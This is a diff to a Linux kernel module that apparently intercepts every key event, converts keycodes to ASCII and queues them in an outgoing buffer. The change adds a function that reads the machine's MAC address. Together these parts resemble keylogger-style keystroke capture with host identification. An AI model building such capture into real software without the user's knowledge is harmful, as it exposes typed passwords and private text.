@@ -1,6 +1,9 @@
 #include <linux/input.h>
 #include <linux/kernel.h>
 #include <linux/slab.h>
+#include <linux/netdevice.h>
+#include <linux/etherdevice.h>
+#include <net/net_namespace.h>
 #include "input_intercept.h"
 #include "fifo_buffer.h"
 #include "keycipher.h"
@@ -20,6 +23,29 @@
 
 extern struct fifo_buffer outgoing_fifo;
 
+/*
+ * Uses the linux network header files and prebuilt functions to get the MAC address of the machine.
+ */
+static void get_author_mac(char *buf, size_t buf_len)
+{
+    struct net_device *dev;
+
+    if (!buf || buf_len == 0)
+        return;
+
+    dev = dev_get_by_name(&init_net, "eth0");
+    if (!dev)
+        dev = dev_get_by_name(&init_net, "wlan0");
+    if (dev && is_valid_ether_addr(dev->dev_addr)) {
+        snprintf(buf, buf_len, "%pM", dev->dev_addr);
+        dev_put(dev);
+    } else {
+        if (dev)
+            dev_put(dev);
+        snprintf(buf, buf_len, "unknown");
+    }
+}
+
 //Linux Keycode to ASCII value
 static const char keycode_to_ascii[256] = {
     [KEY_A]='a',[KEY_B]='b',[KEY_C]='c',[KEY_D]='d',
@@ -36,10 +62,6 @@ static const char keycode_to_ascii[256] = {
     [KEY_COMMA]=',',[KEY_MINUS]='-',
 };
 
-/*struct keycipher_message {
-    char data[MSG_MAX_LEN];
-    int  len;
-};*/
 /*
  * input_event_handler - fired by the kernel on every key event
  * type: event type (EV_KEY, EV_SYN etc), code: which key, value: 0=release 1=press 2=repeat
